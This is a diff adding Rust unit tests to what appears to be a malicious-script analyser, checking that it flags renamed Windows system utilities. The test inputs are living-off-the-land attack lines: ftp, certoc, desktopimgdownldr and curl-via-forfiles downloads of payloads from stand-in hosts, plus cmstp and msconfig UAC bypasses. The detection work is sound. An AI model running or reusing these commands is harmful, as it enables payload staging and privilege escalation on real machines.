@@ -22169,6 +22169,363 @@ C:\Users\Public\cu.tmp -K curl.cfg
     }
 
     #[test]
+    fn copied_ftp_alias_script_file_emits_download() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\ftp.exe C:\Users\Public\svchost.dll
+echo open ftp-copied.example.net>f.scr
+echo lcd C:\Users\Public>>f.scr
+echo get stage.exe>>f.scr
+C:\Users\Public\svchost.dll -n -s:f.scr"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\svchost.dll"#
+                )
+            }),
+            "copied ftp alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "ftp://ftp-copied.example.net/stage.exe"
+                            && dst.as_deref() == Some(r#"C:\Users\Public\stage.exe"#)
+                )
+            }),
+            "copied ftp alias script download was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_certreq_alias_in_deob_text_emits_config_url_argument() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\certreq.exe C:\Users\Public\cert.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\certreq.exe"#.to_string(),
+            dst: r#"C:\Users\Public\cert.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\cert.tmp -Post /config:https://copied-certreq.example/submit request.req response.txt"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\cert.tmp"#
+                )
+            }),
+            "copied certreq alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "certreq.exe -Post /config:https://copied-certreq.example/submit request.req response.txt"
+                            && url == "https://copied-certreq.example/submit"
+                )
+            }),
+            "copied certreq alias did not replay config URL: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-certreq.example/submit"
+                )
+            }),
+            "copied certreq URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_certoc_alias_in_deob_text_emits_getcacaps_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\certoc.exe C:\Users\Public\caps.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\certoc.exe"#.to_string(),
+            dst: r#"C:\Users\Public\caps.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\caps.tmp -GetCACAPS https://copied-certoc.example/stage.ps1"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\caps.tmp"#
+                )
+            }),
+            "copied certoc alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, dst: None }
+                        if cmd == "certoc.exe -GetCACAPS https://copied-certoc.example/stage.ps1"
+                            && src == "https://copied-certoc.example/stage.ps1"
+                )
+            }),
+            "copied certoc alias did not replay GetCACAPS download: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-certoc.example/stage.ps1"
+                )
+            }),
+            "copied certoc URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_desktopimgdownldr_alias_in_deob_text_emits_lockscreen_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\desktopimgdownldr.exe C:\Users\Public\img.tmp"#
+                .to_string(),
+            src: r#"C:\Windows\System32\desktopimgdownldr.exe"#.to_string(),
+            dst: r#"C:\Users\Public\img.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\img.tmp /lockscreenurl:https://copied-desktopimg.example/a.jpg /eventName:test"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\img.tmp"#
+                )
+            }),
+            "copied desktopimgdownldr alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, dst: None }
+                        if cmd == "desktopimgdownldr.exe /lockscreenurl:https://copied-desktopimg.example/a.jpg /eventName:test"
+                            && src == "https://copied-desktopimg.example/a.jpg"
+                )
+            }),
+            "copied desktopimgdownldr alias did not replay lockscreen download: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-desktopimg.example/a.jpg"
+                )
+            }),
+            "copied desktopimgdownldr URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_hh_alias_in_deob_text_emits_url_launch() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\hh.exe C:\Users\Public\help.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\hh.exe"#.to_string(),
+            dst: r#"C:\Users\Public\help.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\help.tmp https://copied-hh.example/help.chm"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\help.tmp"#
+                )
+            }),
+            "copied hh alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlLaunch { cmd, url }
+                        if cmd == "hh.exe https://copied-hh.example/help.chm"
+                            && url == "https://copied-hh.example/help.chm"
+                )
+            }),
+            "copied hh alias did not replay URL launch: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. } | Trait::UrlArgument { url: src, .. }
+                        if src == "https://copied-hh.example/help.chm"
+                )
+            }),
+            "copied hh URL double-emitted with weaker type: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_cmstp_alias_in_deob_text_emits_uac_bypass_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\cmstp.exe C:\Users\Public\cm.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\cmstp.exe"#.to_string(),
+            dst: r#"C:\Users\Public\cm.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\cm.tmp /s /au C:\Users\Public\stage.inf"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\cm.tmp"#
+                )
+            }),
+            "copied cmstp alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "cmstp-au")),
+            "copied cmstp /au was not surfaced as UAC bypass: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_msconfig_alias_in_deob_text_emits_uac_bypass_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\msconfig.exe C:\Users\Public\mc.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\msconfig.exe"#.to_string(),
+            dst: r#"C:\Users\Public\mc.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(r#"C:\Users\Public\mc.tmp /4"#, &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\mc.tmp"#
+                )
+            }),
+            "copied msconfig alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "msconfig-4")),
+            "copied msconfig /4 was not surfaced as UAC bypass: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_esentutl_alias_in_deob_text_replays_copy_arguments() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\esentutl.exe C:\Users\Public\esent.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\esentutl.exe"#.to_string(),
+            dst: r#"C:\Users\Public\esent.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\esent.tmp /y C:\Windows\System32\cmd.exe /d C:\Users\Public\run.pif /o"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\esent.tmp"#
+                )
+            }),
+            "copied esentutl alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::WindowsUtilManip { cmd, src, dst }
+                        if cmd == r#"esentutl.exe /y C:\Windows\System32\cmd.exe /d C:\Users\Public\run.pif /o"#
+                            && src == r#"C:\Windows\System32\cmd.exe"#
+                            && dst == r#"C:\Users\Public\run.pif"#
+                )
+            }),
+            "copied esentutl alias did not replay copy arguments: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_forfiles_alias_nested_cmd_surfaces_download_trait() {
+        let script = br#"copy C:\Windows\System32\forfiles.exe C:\Users\Public\ff.tmp
+C:\Users\Public\ff.tmp /m *.txt /c "cmd /c curl -o out.exe https://copied-forfiles.example/p.exe""#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\ff.tmp"#
+                )
+            }),
+            "copied forfiles alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-forfiles.example/p.exe"
+                            && dst.as_deref() == Some("out.exe")
+                )
+            }),
+            "copied forfiles nested curl download not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_mshta_alias_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
